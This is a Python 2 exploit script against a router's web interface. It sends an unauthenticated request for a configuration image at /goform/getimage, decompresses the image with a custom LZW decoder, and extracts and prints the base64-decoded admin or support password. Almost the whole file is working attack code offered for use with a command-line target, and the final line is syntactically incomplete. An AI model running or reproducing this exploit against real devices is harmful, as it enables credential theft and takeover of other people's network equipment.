import struct
import itertools
import random, sys
import requests
import base64



FETCH_CODE = "\x80\x0f\x07\xe7\x83i\xb0@v2\x9c\x8ef\x93y\xb8z"
ADMIN_LOG_CFG = {'AdminPassword': 'admin', 'SupportPassword': 'support'}

CLEAR_CODE = 256
END_OF_CODE = CLEAR_CODE + 1

MIN_WIDTH = 8
DEFAULT_MIN_BITS = MIN_WIDTH + 1
DEFAULT_MAX_BITS = 12


def cmsDecoder(compressed_cfg):
	_cp_dict = dict((pt, struct.pack("B", pt)) for pt in range(256))
	_cp_dict[CLEAR_CODE] = CLEAR_CODE
	_cp_dict[END_OF_CODE] = END_OF_CODE
	prefix, offset, ignore = None, 0, 0
	codepoints_arr, remainder, bits = [], [], []

	init_csize = len(_cp_dict)

	codesize = init_csize
	minwidth = MIN_WIDTH
	while (1 << minwidth) < codesize:
		minwidth = minwidth + 1
	pointwidth = minwidth

	buts_arr = []
	for b in compressed_cfg:
		value = struct.unpack("B", b)[0]
		for bitplusone in range(8, 0, -1):
			bitindex = bitplusone - 1
			buts_arr.append(1 & (value >> bitindex))

	for nextbit in buts_arr:
		offset = (offset + 1) % 8
		if ignore > 0:
			ignore = ignore - 1
			continue
		bits.append(nextbit)
		if len(bits) == pointwidth:
			cp_int = 0
			lsb_first = [b for b in bits]
			lsb_first.reverse()
			for bit_index in range(len(lsb_first)):
				if lsb_first[bit_index]:
					cp_int = cp_int | (1 << bit_index)

			bits = []
			codepoints_arr.append(cp_int)
			codesize = codesize + 1
			if cp_int in [CLEAR_CODE, END_OF_CODE]:
				codesize = init_csize
				pointwidth = minwidth
			else:
				while codesize >= (2 ** pointwidth):
					pointwidth = pointwidth + 1
			if cp_int == END_OF_CODE:
				ignore = (8 - offset) % 8


	decodedBytes = []
	for cp_int in codepoints_arr:
		suffix = ""
		if cp_int == CLEAR_CODE:
			_cp_dict = dict((pt, struct.pack("B", pt)) for pt in range(256))
			_cp_dict[CLEAR_CODE] = CLEAR_CODE
			_cp_dict[END_OF_CODE] = END_OF_CODE
			prefix = None

		elif cp_int != END_OF_CODE:
			if cp_int in _cp_dict:
				suffix = _cp_dict[cp_int]
				if None != prefix:
					_cp_dict[len(_cp_dict)] = prefix + suffix[0]
			else:
				suffix = prefix + prefix[0]
				_cp_dict[len(_cp_dict)] = suffix
			prefix = suffix
		decoded = suffix
		for char in decoded:
			decodedBytes.append(char)
	return decodedBytes






def exploit(ip):
	print("[!] Downloading config")
	try:
		r = requests.get("http://{}/goform/getimage".format(ip))
		pass
	except:
		print("[-] Failed to download the config, the target may not be vulnerable")

	BIN_CONTENT = r.content
	BIN_CONTENT = BIN_CONTENT[BIN_CONTENT.index(FETCH_CODE):][:16*50]

	CONFIG_XML = b"".join(cmsDecoder(BIN_CONTENT))

	USER_, PASS_ = "", ""
	for i in ADMIN_LOG_CFG.keys():
		if i in CONFIG_XML:
			CONFIG_XML = CONFIG_XML[CONFIG_XML.index(i) + len(i) + 1:]
			PASS_ = CONFIG_XML[:CONFIG_XML.index('</')]
			USER_ = ADMIN_LOG_CFG[i]
			print("\tusername: {}\n\tpassword: {}\n".format(USER_, base64.b64decode(PASS_).rstrip('\x00')))
			return 0
	print("[-] Failed to decode the config file\n")
	return -1



if len(sys.argv) == 1:
	print("usage: python2 " + sys.argv[0] + " router_ip")
	print("example: python2 exploit.py http://192.168.1.1")
	exit()



if __name__ == "__main__":
	try:
		exploit(sys.argv[1])
	except Exception as e:
		print(str(e)

